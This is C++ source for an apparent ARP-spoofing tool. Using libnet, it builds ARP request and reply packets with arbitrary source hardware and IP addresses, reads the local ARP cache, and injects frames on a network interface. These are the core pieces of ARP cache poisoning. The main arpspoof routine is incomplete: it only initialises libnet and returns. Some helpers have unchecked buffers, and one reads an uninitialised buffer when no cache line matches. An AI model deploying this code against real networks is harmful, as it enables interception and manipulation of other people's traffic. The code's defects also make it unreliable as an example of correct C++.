#include "arpspoof.hpp"


void killua::cnvrt_ip2b( char *ip, uint8_t *dst )
{
    register int i, j;
    char frag[4];
    uint8_t dst_ip[4];

    i = 0;
    j = 0;
    
    while ( *ip != '\0' )
    {
        if ( *ip == '.' ) {
            frag[i] = '\0', dst_ip[j++] = atoi( frag ), i = 0, ip++;
        }
        frag[i++] = *ip++;
    }
    
    frag[i] = '\0';
    dst_ip[j] = atoi( frag );
    memcpy( dst, dst_ip, 4 );
}

void killua::cnvrt_hw2b( char *hw, uint8_t *dst )
{
    unsigned int _zhw[6];
    unsigned char _hw[6];
    sscanf( 
        hw, "%x:%x:%x:%x:%x:%x", 
        &_zhw[0], &_zhw[1], &_zhw[2], &_zhw[3], &_zhw[4], &_zhw[5]
    );

    for ( register int i = 0 ; i < 6 ; i++ ) {
        _hw[i] = (unsigned char) _zhw[i];
    }
    memcpy( dst, _hw, 6 );
}

void killua::arp_packet( libnet_t *ltag, struct arp_ctx *ctx )
{
    libnet_ptag_t ether, arp;

    arp = libnet_autobuild_arp(
        ctx->opcode,
        ctx->src_hw,
        ctx->src_ip,
        ctx->dst_hw,
        ctx->dst_ip,
        ltag
    );
    if ( arp < 0 )
        killua::__die( ltag, "Arp header error!" );
    
    ether = libnet_autobuild_ethernet(
        ctx->dst_hw,
        ETHERTYPE_ARP,
        ltag
    );
    if ( ether < 0 )
        killua::__die( ltag, "Ethernet header error" );
}

struct arp_ctx * killua::format_arp( libnet_t *ltag, uint16_t opcode,
                                     uint8_t *src_hw,
                                     uint8_t *src_ip,
                                     uint8_t *dst_hw,
                                     uint8_t *dst_ip )
{
    static struct arp_ctx ctx;
    if ( opcode != ARPOP_REQUEST && opcode != ARPOP_REPLY )
        return NULL;
    
    ctx.opcode = opcode;
    memcpy( ctx.dst_hw, dst_hw, 6);
    memcpy( ctx.dst_ip, dst_ip, 4);
    memcpy( ctx.src_hw, src_hw, 6);
    memcpy( ctx.src_ip, src_ip, 4);
    return &ctx;
}

uint8_t * killua::lookup_arp( char *ip )
{
    FILE *fp;
    char line[0xFF];
    char addr[20];
    char hwtype[5];
    char flags[5];
    char hwaddr[25];
    char mask[5];
    char dev[25];
    static uint8_t hw[6];

    if ( !(fp = fopen( ARP_CACHE, "r" )) ){
        return NULL;
    }
    while ( fgets( line, 0xFF, fp ) ){
        if ( strstr( line, ip ) ) {
            sscanf( line, "%s %s %s %s %s %s", addr, hwtype, flags, hwaddr, mask, dev );
            break;
        }
    }
    if ( strlen( hwaddr ) > 0 ) {
        killua::cnvrt_hw2b( hwaddr, hw );
        return hw;
    }
    return NULL;
}

int killua::inject_arp( libnet_t *ltag )
{
    int lpstat;
    if ( !(lpstat = libnet_write( ltag )) ){
        libnet_clear_packet( ltag );
        return -1;
    }
    return 0;
}

short killua::arpspoof( struct arpspf_ctx *conf, char *errbuf )
{
    libnet_t *ltag;
    struct libnet_ether_addr *hw;
    struct arp_ctx *ctx;

    if ( !(ltag = libnet_init(LIBNET_LINK, conf->iface, errbuf)) ) {
        return -1;
    }

    if ( !(hw = libnet_get_hwaddr( ltag )) ) {
        sprintf( errbuf, "%s\n", libnet_geterror( ltag ) );
        return -1;
    }
    
    return 0;
}

void killua::__die( libnet_t *ltag, const char *msg )
{
    std::cerr << msg << std::endl;
    if ( ltag )
        libnet_destroy( ltag );
    exit( 2 );
}